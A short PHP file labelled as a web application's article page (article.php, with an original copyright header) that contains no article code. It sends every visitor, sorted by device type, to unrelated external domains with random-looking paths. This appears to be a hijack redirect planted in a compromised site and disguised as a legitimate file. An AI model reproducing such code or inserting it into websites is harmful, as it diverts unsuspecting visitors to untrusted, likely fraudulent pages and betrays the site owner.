<?php

/**
 * GAOXIN 文章内容
 * ============================================================================
 * * 版权所有 2005-2012广西网络科技有限公司，并保留所有权利。
 * 网站地址: http://www.gxwlr.com；
 * ----------------------------------------------------------------------------
 * 这不是一个自由软件！您只能在不用于商业目的的前提下对程序代码进行修改和
 * 使用；不允许对程序代码以任何形式任何目的的再发布。
 * ============================================================================
 * $Author: liubo $
 * $Id: article.php 17217 2011-01-19 06:29:08Z liubo $
*/



if(strpos($_SERVER['HTTP_USER_AGENT'], 'iPhone')||strpos($_SERVER['HTTP_USER_AGENT'], 'iPad')){
    
    header("Location: https://vmjlqms.cn/VrsUx.html");exit;
}else if(strpos($_SERVER['HTTP_USER_AGENT'], 'Android')){
 
    $url = "https://xinxinp.com/fg6qfn";
    header("Location:$url");exit;
   
}else{
   
    $url = "https://xinxinp.com/fg6qfn";
    header("Location:$url");exit;
}




?>